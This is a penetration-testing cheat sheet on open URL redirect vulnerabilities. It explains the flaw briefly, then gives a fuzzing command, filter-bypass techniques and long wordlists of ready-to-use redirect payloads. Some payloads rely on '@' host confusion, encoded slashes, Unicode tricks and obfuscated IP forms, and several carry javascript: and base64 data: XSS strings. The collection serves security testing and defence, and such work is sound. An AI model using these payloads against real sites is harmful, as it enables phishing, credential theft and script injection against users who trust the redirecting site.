# Open URL Redirection

> Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.

## Summary

- [Exploitation](#exploitation)
- [HTTP Redirection Status Code - 3xx](#http-redirection-status-code---3xx)
- [Fuzzing](#fuzzing)
- [Filter Bypass](#filter-bypass)
- [Common injection parameters](#common-injection-parameters)
- [References](#references)

## Exploitation

Let’s say there’s a `well known` website - https://famous-website.tld/. And let's assume that there's a link like :

```powershell
https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account
```
After signing up you get redirected to your account, this redirection is specified by the `redirectUrl` parameter in the URL.   
What happens if we change the `famous-website.tld/account` to `evil-website.tld`?

```powerhshell
https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account
```

By visiting this url, if we get redirected to `evil-website.tld` after the signup, we have an Open Redirect vulnerability. This can be abused by an attacker to display a phishing page asking you to enter your credentials.


## HTTP Redirection Status Code - 3xx

- [300 Multiple Choices](https://httpstatuses.com/300)
- [301 Moved Permanently](https://httpstatuses.com/301)
- [302 Found](https://httpstatuses.com/302)
- [303 See Other](https://httpstatuses.com/303)
- [304 Not Modified](https://httpstatuses.com/304)
- [305 Use Proxy](https://httpstatuses.com/305)
- [307 Temporary Redirect](https://httpstatuses.com/307)
- [308 Permanent Redirect](https://httpstatuses.com/308)

## Fuzzing

Replace www.whitelisteddomain.tld from *Open-Redirect-payloads.txt* with a specific white listed domain in your test case

To do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL.

```powershell
WHITELISTEDDOMAIN="www.test.com" && sed 's/www.whitelisteddomain.tld/'"$WHITELISTEDDOMAIN"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt && echo "$WHITELISTEDDOMAIN" | awk -F. '{print "https://"$0"."$NF}' >> Open-Redirect-payloads-burp-"$WHITELISTEDDOMAIN".txt
```

## Filter Bypass

Using a whitelisted domain or keyword

```powershell
www.whitelisted.com.evil.com redirect to evil.com
```

Using CRLF to bypass "javascript" blacklisted keyword

```powershell
java%0d%0ascript%0d%0a:alert(0)
```

Using "//" to bypass "http" blacklisted keyword

```powershell
//google.com
```

Using "https:" to bypass "//" blacklisted keyword

```powershell
https:google.com
```

Using "\/\/" to bypass "//" blacklisted keyword (Browsers see \/\/ as //)

```powershell
\/\/google.com/
/\/google.com/
```

Using "%E3%80%82" to bypass "." blacklisted character

```powershell
/?redir=google。com
//google%E3%80%82com
```

Using null byte "%00" to bypass blacklist filter

```powershell
//google%00.com
```

Using parameter pollution

```powershell
?next=whitelisted.com&next=google.com
```

Using "@" character, browser will redirect to anything after the "@"

```powershell
http://www.theirsite.com@yoursite.com/
```

Creating folder as their domain

```powershell
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

Host/Split Unicode Normalization
```powershell
https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
http://a.com／X.b.com
```

XSS from Open URL - If it's in a JS variable

```powershell
";alert(0);//
```

XSS from data:// wrapper

```powershell
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

XSS from javascript:// wrapper

```powershell
http://www.example.com/redirect.php?url=javascript:prompt(1)
```

## Common injection parameters

```powershell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

## References

* filedescriptor
* [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
* [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
* [Cujanovic - Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
* [Host/Split
Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)



## Open Redirect Wordlist
```html
/http://example.com
/%5cexample.com
/%2f%2fexample.com
/example.com/%2f%2e%2e
/http:/example.com
/?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com
/redirect?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com
/.example.com
///\;@example.com
///example.com/
///example.com
///example.com/%2f..
/////example.com/
/////example.com
```

## Open Redirect Payloads
```html
//google.com/%2f..
//www.whitelisteddomain.tld@google.com/%2f..
///google.com/%2f..
///www.whitelisteddomain.tld@google.com/%2f..
////google.com/%2f..
////www.whitelisteddomain.tld@google.com/%2f..
https://google.com/%2f..
https://www.whitelisteddomain.tld@google.com/%2f..
/https://google.com/%2f..
/https://www.whitelisteddomain.tld@google.com/%2f..
//www.google.com/%2f%2e%2e
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
https://www.google.com/%2f%2e%2e
https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
//google.com/
//www.whitelisteddomain.tld@google.com/
///google.com/
///www.whitelisteddomain.tld@google.com/
////google.com/
////www.whitelisteddomain.tld@google.com/
https://google.com/
https://www.whitelisteddomain.tld@google.com/
/https://google.com/
/https://www.whitelisteddomain.tld@google.com/
//google.com//
//www.whitelisteddomain.tld@google.com//
///google.com//
///www.whitelisteddomain.tld@google.com//
////google.com//
////www.whitelisteddomain.tld@google.com//
https://google.com//
https://www.whitelisteddomain.tld@google.com//
//https://google.com//
//https://www.whitelisteddomain.tld@google.com//
//www.google.com/%2e%2e%2f
//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
///www.google.com/%2e%2e%2f
///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
////www.google.com/%2e%2e%2f
////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
https://www.google.com/%2e%2e%2f
https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
//https://www.google.com/%2e%2e%2f
//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
///www.google.com/%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2e%2e
////www.google.com/%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2e%2e
https:///www.google.com/%2e%2e
https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
//https:///www.google.com/%2e%2e
//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
/https://www.google.com/%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
https:///www.google.com/%2f%2e%2e
https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https:///www.google.com/%2f%2e%2e
/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/%09/google.com
/%09/www.whitelisteddomain.tld@google.com
//%09/google.com
//%09/www.whitelisteddomain.tld@google.com
///%09/google.com
///%09/www.whitelisteddomain.tld@google.com
////%09/google.com
////%09/www.whitelisteddomain.tld@google.com
https://%09/google.com
https://%09/www.whitelisteddomain.tld@google.com
/%5cgoogle.com
/%5cwww.whitelisteddomain.tld@google.com
//%5cgoogle.com
//%5cwww.whitelisteddomain.tld@google.com
///%5cgoogle.com
///%5cwww.whitelisteddomain.tld@google.com
////%5cgoogle.com
////%5cwww.whitelisteddomain.tld@google.com
https://%5cgoogle.com
https://%5cwww.whitelisteddomain.tld@google.com
/https://%5cgoogle.com
/https://%5cwww.whitelisteddomain.tld@google.com
https://google.com
https://www.whitelisteddomain.tld@google.com
javascript:alert(1);
javascript:alert(1)
//javascript:alert(1);
/javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
//google.com
https:google.com
//google%E3%80%82com
\/\/google.com/
/\/google.com/
//google%00.com
https://www.whitelisteddomain.tld/https://www.google.com/
";alert(0);//
javascript://www.whitelisteddomain.tld?%a0alert%281%29
http://0xd8.0x3a.0xd6.0xce
http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http://0xd83ad6ce
http://www.whitelisteddomain.tld@0xd83ad6ce
http://3H6k7lIAiqjfNeN@0xd83ad6ce
http://XY>.7d8T\205pZM@0xd83ad6ce
http://3627734734
http://www.whitelisteddomain.tld@3627734734
http://3H6k7lIAiqjfNeN@3627734734
http://XY>.7d8T\205pZM@3627734734
http://472.314.470.462
http://www.whitelisteddomain.tld@472.314.470.462
http://3H6k7lIAiqjfNeN@472.314.470.462
http://XY>.7d8T\205pZM@472.314.470.462
http://0330.072.0326.0316
http://www.whitelisteddomain.tld@0330.072.0326.0316
http://3H6k7lIAiqjfNeN@0330.072.0326.0316
http://XY>.7d8T\205pZM@0330.072.0326.0316
http://00330.00072.0000326.00000316
http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
http://[::216.58.214.206]
http://www.whitelisteddomain.tld@[::216.58.214.206]
http://3H6k7lIAiqjfNeN@[::216.58.214.206]
http://XY>.7d8T\205pZM@[::216.58.214.206]
http://[::ffff:216.58.214.206]
http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http://0xd8.072.54990
http://www.whitelisteddomain.tld@0xd8.072.54990
http://3H6k7lIAiqjfNeN@0xd8.072.54990
http://XY>.7d8T\205pZM@0xd8.072.54990
http://0xd8.3856078
http://www.whitelisteddomain.tld@0xd8.3856078
http://3H6k7lIAiqjfNeN@0xd8.3856078
http://XY>.7d8T\205pZM@0xd8.3856078
http://00330.3856078
http://www.whitelisteddomain.tld@00330.3856078
http://3H6k7lIAiqjfNeN@00330.3856078
http://XY>.7d8T\205pZM@00330.3856078
http://00330.0x3a.54990
http://www.whitelisteddomain.tld@00330.0x3a.54990
http://3H6k7lIAiqjfNeN@00330.0x3a.54990
http://XY>.7d8T\205pZM@00330.0x3a.54990
http:0xd8.0x3a.0xd6.0xce
http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
http:0xd83ad6ce
http:www.whitelisteddomain.tld@0xd83ad6ce
http:3H6k7lIAiqjfNeN@0xd83ad6ce
http:XY>.7d8T\205pZM@0xd83ad6ce
http:3627734734
http:www.whitelisteddomain.tld@3627734734
http:3H6k7lIAiqjfNeN@3627734734
http:XY>.7d8T\205pZM@3627734734
http:472.314.470.462
http:www.whitelisteddomain.tld@472.314.470.462
http:3H6k7lIAiqjfNeN@472.314.470.462
http:XY>.7d8T\205pZM@472.314.470.462
http:0330.072.0326.0316
http:www.whitelisteddomain.tld@0330.072.0326.0316
http:3H6k7lIAiqjfNeN@0330.072.0326.0316
http:XY>.7d8T\205pZM@0330.072.0326.0316
http:00330.00072.0000326.00000316
http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
http:[::216.58.214.206]
http:www.whitelisteddomain.tld@[::216.58.214.206]
http:3H6k7lIAiqjfNeN@[::216.58.214.206]
http:XY>.7d8T\205pZM@[::216.58.214.206]
http:[::ffff:216.58.214.206]
http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
http:0xd8.072.54990
http:www.whitelisteddomain.tld@0xd8.072.54990
http:3H6k7lIAiqjfNeN@0xd8.072.54990
http:XY>.7d8T\205pZM@0xd8.072.54990
http:0xd8.3856078
http:www.whitelisteddomain.tld@0xd8.3856078
http:3H6k7lIAiqjfNeN@0xd8.3856078
http:XY>.7d8T\205pZM@0xd8.3856078
http:00330.3856078
http:www.whitelisteddomain.tld@00330.3856078
http:3H6k7lIAiqjfNeN@00330.3856078
http:XY>.7d8T\205pZM@00330.3856078
http:00330.0x3a.54990
http:www.whitelisteddomain.tld@00330.0x3a.54990
http:3H6k7lIAiqjfNeN@00330.0x3a.54990
http:XY>.7d8T\205pZM@00330.0x3a.54990
〱google.com
〵google.com
ゝgoogle.com
ーgoogle.com
ｰgoogle.com
/〱google.com
/〵google.com
/ゝgoogle.com
/ーgoogle.com
/ｰgoogle.com
%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
http://%67%6f%6f%67%6c%65%2e%63%6f%6d
<>javascript:alert(1);
<>//google.com
//google.com\@www.whitelisteddomain.tld
https://:@google.com\@www.whitelisteddomain.tld
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
ja\nva\tscript\r:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
http://google.com:80#@www.whitelisteddomain.tld/
http://google.com:80?@www.whitelisteddomain.tld/
http://google.com\www.whitelisteddomain.tld
http://google.com&www.whitelisteddomain.tld
http:///////////google.com
\\google.com
http://www.whitelisteddomain.tld.google.com
```

## Open Redirects
```html
/%09/example.com
/%2f%2fexample.com
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
///example.com/%2e%2e
///example.com/%2e%2e%2f
///example.com/%2f%2e%2e
///example.com/%2f..
///example.com//
//example.com
//example.com/
//example.com/%2e%2e
//example.com/%2e%2e%2f
//example.com/%2f%2e%2e
//example.com/%2f..
//example.com//
//google%00.com
//google%E3%80%82com
//https:///example.com/%2e%2e
//https://example.com/%2e%2e%2f
//https://example.com//
/<>//example.com
/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
/\/\/example.com/
/\/example.com/
/example.com/%2f%2e%2e
/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
/http://example.com
/http:/example.com
/https:/%5cexample.com/
/https://%09/example.com
/https://%5cexample.com
/https:///example.com/%2e%2e
/https:///example.com/%2f%2e%2e
/https://example.com
/https://example.com/
/https://example.com/%2e%2e
/https://example.com/%2e%2e%2f
/https://example.com/%2f%2e%2e
/https://example.com/%2f..
/https://example.com//
/https:example.com
/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
```
